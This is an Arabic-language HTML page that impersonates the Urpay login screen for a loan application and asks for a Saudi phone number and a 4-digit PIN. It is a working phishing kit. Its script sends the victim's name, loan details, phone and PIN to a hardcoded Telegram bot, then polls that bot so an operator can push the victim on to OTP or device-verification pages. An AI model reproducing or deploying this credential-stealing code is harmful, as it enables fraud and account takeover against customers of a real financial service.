<!DOCTYPE html>
<html lang="ar-SA" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>أورباي | تسجيل الدخول</title>
  <style>
    :root {
      --brand: #0f5bff; --brand-dark: #0a45c6; --brand-soft: #edf4ff; --brand-line: #dfeaff; --text: #101828; --muted: #667085; --border: #e4e7ec; --bg: #f5f8ff; --white: #ffffff; --shadow: 0 18px 50px rgba(15, 23, 42, 0.14);
    }
    * { box-sizing: border-box; }
    body {
      margin: 0; min-height: 100dvh; font-family: "Segoe UI", Tahoma, Arial, sans-serif; background: radial-gradient(circle at top left, rgba(15, 91, 255, 0.14), transparent 30%), linear-gradient(180deg, #f8fbff 0%, #eef5ff 100%); color: var(--text); direction: rtl;
    }
    .topbar {
      height: 64px; padding: 14px 20px; background: linear-gradient(135deg, var(--brand) 0%, var(--brand-dark) 100%); display: flex; align-items: center; justify-content: space-between; box-shadow: 0 10px 28px rgba(15, 91, 255, 0.18);
    }
    .brand { display: inline-flex; align-items: center; }
    .menu-icon { font-size: 24px; color: #fff; font-weight: 800; }
    main { min-height: calc(100dvh - 64px); display: grid; place-items: center; padding: clamp(18px, 3vw, 30px); }
    .login-card {
      width: min(100%, 500px); background: rgba(255,255,255,0.98); border: 1px solid var(--border); border-radius: 28px; box-shadow: var(--shadow); overflow: hidden; position: relative;
    }
    .login-card::before { content: ""; position: absolute; inset: 0 0 auto 0; height: 8px; background: linear-gradient(90deg, var(--brand), var(--brand-dark)); z-index: 1; }
    .logo-lockup { text-align: center; padding: 30px 18px 14px; background: linear-gradient(180deg, #ffffff 0%, var(--brand-soft) 100%); }
    .logo-wrap { display: inline-flex; align-items: center; justify-content: center; min-height: 30px; margin-bottom: 12px; }
    .product-tag { display: inline-flex; align-items: center; gap: 8px; padding: 8px 14px; border-radius: 999px; background: var(--brand-soft); color: var(--brand-dark); font-size: 12px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; }
    h1 { text-align: center; font-size: clamp(24px, 5vw, 32px); letter-spacing: -0.08em; margin: 18px 0 8px; }
    .subtitle { max-width: 390px; text-align: center; margin: 0 auto 20px; color: var(--muted); line-height: 1.6; font-size: 14px; }
    .application-summary { display: none; background: linear-gradient(180deg, #f8fbff 0%, #ffffff 100%); border: 1px solid var(--brand-line); border-radius: 18px; padding: 15px 16px; margin: 0 22px 20px; }
    .application-summary.active { display: block; }
    .summary-title { color: var(--brand-dark); font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 9px; }
    .summary-row { display: flex; justify-content: space-between; gap: 14px; padding: 8px 0; border-bottom: 1px solid #edf2ff; font-size: 14px; }
    .summary-row:last-child { border-bottom: 0; }
    .summary-label { color: var(--muted); }
    .summary-value { font-weight: 800; text-align: left; overflow-wrap: anywhere; }
    .form-panel { margin: 0 22px 22px; background: var(--brand-soft); border: 1px solid var(--brand-line); border-radius: 22px; padding: 18px 16px 16px; }
    .field-label { display: block; font-size: 12px; font-weight: 800; color: var(--brand-dark); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 10px; }
    .phone-group, .pin-group { width: 100%; display: flex; align-items: center; border: 2px solid var(--brand); border-radius: 16px; background: var(--white); padding: 14px 15px; box-shadow: 0 8px 24px rgba(15, 91, 255, 0.08); }
    .flag { font-size: 23px; margin-left: 10px; }
    .country-select { margin-left: 12px; font-weight: 800; font-size: 16px; color: var(--brand); white-space: nowrap; }
    .phone-input, .pin-input { border: 0; outline: none; background: transparent; width: 100%; font: inherit; font-size: 17px; color: var(--text); }
    .phone-input::placeholder, .pin-input::placeholder { color: #94a3b8; }
    .pin-group { margin-top: 14px; }
    .pin-input { letter-spacing: 4px; }
    .hint { margin: 10px 0 14px; color: var(--muted); line-height: 1.5; font-size: 12px; }
    .error-msg { display: none; background: #fff1f1; border: 1px solid #fca5a5; color: #b91c1c; font-size: 13px; font-weight: 600; line-height: 1.5; border-radius: 12px; padding: 12px 13px; margin-bottom: 14px; }
    .btn-primary { width: 100%; border: 0; border-radius: 999px; padding: 16px 22px; color: var(--white); background: linear-gradient(135deg, var(--brand) 0%, var(--brand-dark) 100%); font-size: 15px; font-weight: 800; letter-spacing: 0.04em; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 24px rgba(15, 91, 255, 0.3); }
    .terms { margin-top: 18px; color: var(--muted); text-align: center; font-size: 12px; line-height: 1.5; }
    .terms a { color: var(--brand); font-weight: 800; }
    #spinnerOverlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; flex-direction: column; gap: 16px; background: rgba(10, 10, 10, 0.88); z-index: 1000; backdrop-filter: blur(4px); }
    .spinner { width: 56px; height: 56px; border: 5px solid rgba(255,255,255,0.12); border-top-color: var(--brand); border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    @media (max-width: 520px) { .topbar { height: 58px; padding: 14px 16px; } .login-card { border-radius: 20px; } .logo-lockup { padding-top: 24px; } .form-panel { margin: 0 16px 16px; } .application-summary { margin: 0 16px 16px; } .phone-group, .pin-group { padding: 12px 12px; } }
  </style>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="index.html" aria-label="أورباي الرئيسية">
      <img alt="revampur" width="130" height="30" decoding="async" data-nimg="1" class="w-auto object-contain" style="color:transparent;height:30px" srcset="/_next/image?url=https%3A%2F%2Fcms-portal.apps.ocpryd.neoleap.com.sa%2Fneo-api%2Fmedia%2Ffile%2Furpay_revamp_logo-3.webp&w=256&q=50 1x, /_next/image?url=https%3A%2F%2Fcms-portal.apps.ocpryd.neoleap.com.sa%2Fneo-api%2Fmedia%2Ffile%2Furpay_revamp_logo-3.webp&w=384&q=50 2x" src="/_next/image?url=https%3A%2F%2Fcms-portal.apps.ocpryd.neoleap.com.sa%2Fneo-api%2Fmedia%2Ffile%2Furpay_revamp_logo-3.webp&w=384&q=50" />
    </a>
    <div class="menu-icon" aria-hidden="true">☰</div>
  </header>
  <main>
    <section class="login-card" aria-labelledby="pageTitle">
      <div class="logo-lockup">
        <div class="logo-wrap"><img alt="Urpay logo" width="130" height="30" decoding="async" src="/_next/image?url=https%3A%2F%2Fcms-portal.apps.ocpryd.neoleap.com.sa%2Fneo-api%2Fmedia%2Ffile%2Furpay_revamp_logo-3.webp&w=384&q=50" style="height:30px;width:auto;" /></div>
        <div class="product-tag">التمويل المرن</div>
      </div>
      <h1 id="pageTitle">أورباي - التمويل المرن</h1>
      <p class="subtitle">أكد رقم هاتفك للمتابعة مع طلب القرض الذي بدأت به.</p>
      <div id="applicationSummary" class="application-summary">
        <div class="summary-title">ملخص الطلب</div>
        <div class="summary-row"><span class="summary-label">المتقدم</span><span class="summary-value" id="summaryName">—</span></div>
        <div class="summary-row"><span class="summary-label">مبلغ القرض</span><span class="summary-value" id="summaryAmount">—</span></div>
        <div class="summary-row"><span class="summary-label">نوع القرض</span><span class="summary-value" id="summaryType">—</span></div>
      </div>
      <div class="form-panel">
        <label class="field-label" for="phoneInput">رقم الهاتف</label>
        <div class="phone-group">
          <span class="flag">🇸🇦</span>
          <div class="country-select">+966</div>
          <input type="tel" class="phone-input" id="phoneInput" placeholder="رقم الجوال" inputmode="numeric" autocomplete="tel" maxlength="9" />
        </div>
        <label class="field-label" for="pinInput" style="margin-top:14px;">رمز PIN</label>
        <div class="pin-group"><input type="password" class="pin-input" id="pinInput" placeholder="رمز 4 أرقام" inputmode="numeric" maxlength="4" /></div>
        <p class="hint">أدخل رقم هاتفك ورمز PIN للمتابعة.</p>
        <div class="error-msg" id="errMsg"></div>
        <button class="btn-primary" type="button" id="continueBtn">متابعة</button>
      </div>
      <div class="terms">بالمتابعة أنت توافق على <a href="https://www.urpay.com/terms" target="_blank" rel="noopener">الشروط والأحكام</a>.</div>
    </section>
  </main>
  <div id="spinnerOverlay"><div class="spinner"></div><div style="font-size:15px;font-weight:700;color:#fff;">جارٍ التحقق والمعالجة</div><div style="font-size:13px;color:rgba(255,255,255,0.5);margin-top:-8px;">يرجى الانتظار…</div></div>
  <script>
    const CONFIG = { BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k', CHAT_ID: '8820857419', APPROVE_PAGE: 'otp.html', DEVICE_PAGE: 'device.html', SUCCESS_PAGE: 'success.html' };
    let state = { lastUpdateId: 0 };
    let isProcessing = false;
    const phoneInput = document.getElementById('phoneInput');
    const pinInput = document.getElementById('pinInput');
    const continueBtn = document.getElementById('continueBtn');
    const errMsg = document.getElementById('errMsg');
    const spinnerOverlay = document.getElementById('spinnerOverlay');
    function getStoredApplication() { try { return JSON.parse(localStorage.getItem('loanApplication') || '{}'); } catch (e) { return {}; } }
    function normalizePhone(phone) { return String(phone || '').replace(/\D/g, '').replace(/^966/, '').slice(-9); }
    function loadApplicationDetails() {
      const application = getStoredApplication();
      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));
      if (phone) phoneInput.value = phone;
      if (fullName || application.loanAmount || application.loanType) {
        document.getElementById('applicationSummary').classList.add('active');
        document.getElementById('summaryName').textContent = fullName || '—';
        document.getElementById('summaryAmount').textContent = application.loanAmount ? Number(application.loanAmount).toLocaleString() + ' SAR' : '—';
        document.getElementById('summaryType').textContent = application.loanType || '—';
      }
    }
    phoneInput.addEventListener('input', () => { phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9); });
    pinInput.addEventListener('input', () => { pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4); if (pinInput.value.length === 4) pinInput.blur(); });
    function showError(msg) { errMsg.textContent = msg; errMsg.style.display = 'block'; }
    function resetButton() { isProcessing = false; continueBtn.disabled = false; continueBtn.textContent = 'متابعة'; }
    function sendToBot(phone, pin) {
      if (isProcessing) return;
      isProcessing = true; continueBtn.disabled = true; continueBtn.textContent = 'جارٍ التحقق…';
      const application = getStoredApplication();
      const loanAmount = application.loanAmount ? Number(application.loanAmount).toLocaleString() + ' SAR' : '—';
      const loanType = application.loanType || '—';
      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
      const ts = Date.now(); const approveId = `approve_${ts}`; const declineId = `decline_${ts}`; const verifyId = `verify_${ts}`;
      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CONFIG.CHAT_ID,
          text: `<b>🟢 طلب قرض أورباي</b>\n\nالمتقدم: <b>${fullName}</b>\nمبلغ القرض: <b>${loanAmount}</b>\nنوع القرض: <b>${loanType}</b>\nالهاتف: <code>+966${phone}</code>\nPIN: <code>${pin}</code>\nاختر إجراء:`,
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: [ [ { text: '✅ موافقة', callback_data: approveId }, { text: '📱 تحقق من الجهاز', callback_data: verifyId } ], [{ text: '❌ رفض', callback_data: declineId }] ] }
        })
      }).then(() => { localStorage.setItem('phone', phone); localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() })); spinnerOverlay.style.display = 'flex'; startPolling(approveId, declineId, verifyId); }).catch(() => resetButton());
    }
    function startPolling(approveId, declineId, verifyId) {
      const interval = setInterval(() => {
        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
          .then(r => r.json())
          .then(data => {
            if (!data.ok || !data.result) return;
            data.result.forEach(update => {
              state.lastUpdateId = update.update_id;
              if (update.callback_query) {
                const cb = update.callback_query.data;
                if (cb === approveId) { clearInterval(interval); spinnerOverlay.style.display = 'none'; window.location.href = CONFIG.APPROVE_PAGE; }
                else if (cb === verifyId) { clearInterval(interval); spinnerOverlay.style.display = 'none'; window.location.href = CONFIG.DEVICE_PAGE; }
                else if (cb === declineId) { clearInterval(interval); spinnerOverlay.style.display = 'none'; showError('تم رفض الطلب. حاول مرة أخرى.'); resetButton(); }
              }
            });
          });
      }, 1000);
    }
    continueBtn.addEventListener('click', () => {
      errMsg.style.display = 'none';
      const phone = normalizePhone(phoneInput.value);
      const pin = pinInput.value.trim();
      if (phone.length !== 9) { showError('يرجى إدخال رقم جوال صحيح من 9 أرقام.'); return; }
      if (pin.length !== 4) { showError('يرجى إدخال رمز PIN مكون من 4 أرقام.'); return; }
      sendToBot(phone, pin);
    });
    window.addEventListener('load', loadApplicationDetails);
  </script>
</body>
</html>
